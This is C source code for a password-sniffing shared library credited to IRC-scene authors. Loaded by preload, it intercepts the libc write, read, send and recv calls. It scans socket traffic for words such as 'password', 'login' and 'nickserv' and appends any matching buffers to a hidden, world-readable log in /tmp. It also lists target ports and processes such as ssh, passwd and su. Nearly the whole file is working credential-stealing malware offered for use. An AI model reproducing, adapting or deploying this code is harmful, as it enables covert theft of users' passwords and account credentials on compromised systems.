/*
 * hijacking based sniffer - Cassiano Aquino <cassiano@wwsecurity.net>
 * irc.brasnet.org - #linux - chaosmaker
 * idea: Cassiano Aquino <cassiano@wwsecurity.net>
 * initial code: Lucas Fontes <kspoon@wwsecurity.net>
 * code rewrite by me.
 * thnks to: snape for some functions
 * 			 mpersano for the string seeker and filter.
 */
   
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <stdarg.h>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <errno.h>
#include <ctype.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define _GNU_SOURCE

#ifndef vdprintf
extern int vdprintf (int fd, const char *fmt, va_list ap);
#endif


#ifdef USE_BSD
#define DEFAULTLIB "/usr/lib/libc.so" //BSD
#else
#define DEFAULTLIB "/lib/libc.so.6" //Linux
#endif
#define LOG "/tmp/.libsopt.log"

#define MAX_STRING 128

/* lista ligada */

typedef struct _lista {
    char string[MAX_STRING];
    int contagem;

    struct _lista *proximo;
} lista;

char *procname;
int logport[] = {
					6667,
					6668,
					6669,
					9000,
					21,
					80,
					23,
					25,
					110,
					(int)NULL
				 };

char *allproc[] = { 
   					"ssh",
					"passwd",
					"adduser",
					"su",
					NULL
				  };

char *list[] = {
   				"identify",
				"password",
				"login",
				"nickserv",
				"register",
				"chaosmaker",
				NULL
			   };

void monta_listas(char *strings[], lista *lista_de_strings[]) {
    lista *l, *lp;
    char **p;
    memset(lista_de_strings, 0, 256 * sizeof(lista *));
    for(p = strings; *p; p++) {
        l = (lista *)malloc(sizeof(lista));
        strcpy(l->string, *p);
        l->contagem = (int)l->proximo = 0;
        lp = lista_de_strings[(int)*(unsigned char *)*p];
        if(!lp)
            lista_de_strings[(int)*(unsigned char *)*p] = l;
        else {
            while(lp->proximo)
                lp = lp->proximo;
            lp->proximo = l;
        }
    }
}


int seek(char *buffer, lista *lista_de_strings[]) {
    char  *q, *r;
    lista *l;
    while(*buffer) {
        l = lista_de_strings[(int)*(unsigned char *)buffer];
        while(l) {
            for(r = l->string + 1, q = buffer + 1;*r && *q && (*r & ~0x20) == (*q & ~0x20); ++r, ++q);
            if(!*r)
                return 1;
            l = l->proximo;
        }
        ++buffer;
    }
    return 0;
}

void *hh;
static lista *seek_list[256];
ssize_t (*old_write)(int,const void *,size_t);
ssize_t (*old_read)(int,void *,size_t);
int (*old_send)(int,const void *,size_t,int);
int (*old_recv)(int,void *,size_t,int);



int getlocalport(int *fd) {
	int size;
	struct sockaddr_in src;
	return 0;
	size = sizeof(src);
	getsockname(*fd, (struct sockaddr *)&src, &size);
	return (ntohs(src.sin_port));
}

int getremoteport(int *fd) {
	int size;
	struct sockaddr_in src;
	return 0;
	size = sizeof(src);
	getpeername(*fd, (struct sockaddr *)&src, &size);
	return (ntohs(src.sin_port));
}

void _init()
{
   	hh = dlopen(DEFAULTLIB,RTLD_LAZY);
   	old_write = (ssize_t (*)(int,const void *,size_t)) dlsym(hh,"write");
	old_read = (ssize_t (*)(int,void *,size_t)) dlsym(hh,"read");
	old_recv = (int (*)(int,void *,size_t,int)) dlsym(hh,"recv");
	old_send = (int (*)(int,const void *,size_t,int)) dlsym(hh,"send");
    monta_listas(list, seek_list);
}

void _fini()
{
	dlclose(hh);
}

int readit(int fd) {
	struct stat stat_buf;
	if (fd > 2 && fstat(fd,&stat_buf) != -1)
	   return (S_ISSOCK(stat_buf.st_mode));
	return 0;

}

int log(const char *fmt, ...) {
	int fp, r;
	va_list ap;
	if (!(fp = open(LOG, O_WRONLY | O_CREAT | O_APPEND | O_NONBLOCK , 
			S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH)))
	   return 0;
	va_start (ap, fmt);
	r = vdprintf(fp, fmt, ap);
	va_end (ap);
	close(fp);
	return(0);
}

ssize_t write(int fd,const void *buf, size_t count){
	if(readit(fd) && seek((char *)buf,seek_list))  log("[%d - %d] %s",getlocalport(&fd),getremoteport(&fd),(char *)buf);
	return (*old_write)(fd,buf,count);  
}

ssize_t read(int fd,void *buf, size_t count){
	ssize_t x;
	x =  (*old_read)(fd,buf,count);  
	if(readit(fd) && seek((char *)buf,seek_list))   log("[%d - %d] %s",getlocalport(&fd),getremoteport(&fd),(char *)buf);
	return x;
}

int send(int fd, const void *buf, size_t count, int flags) {
	if(readit(fd) && seek((char *)buf,seek_list))  log("[%d - %d] %s",getlocalport(&fd),getremoteport(&fd),(char *)buf);
	return (*old_send)(fd,buf,count,flags);  
}

int recv(int fd, void *buf, size_t count, int flags){
	ssize_t x;
	x =  (*old_recv)(fd,buf,count,flags);  
	if(readit(fd) && seek((char *)buf,seek_list))   log("[%d - %d] %s",getlocalport(&fd),getremoteport(&fd),(char *)buf);
	return x;
}
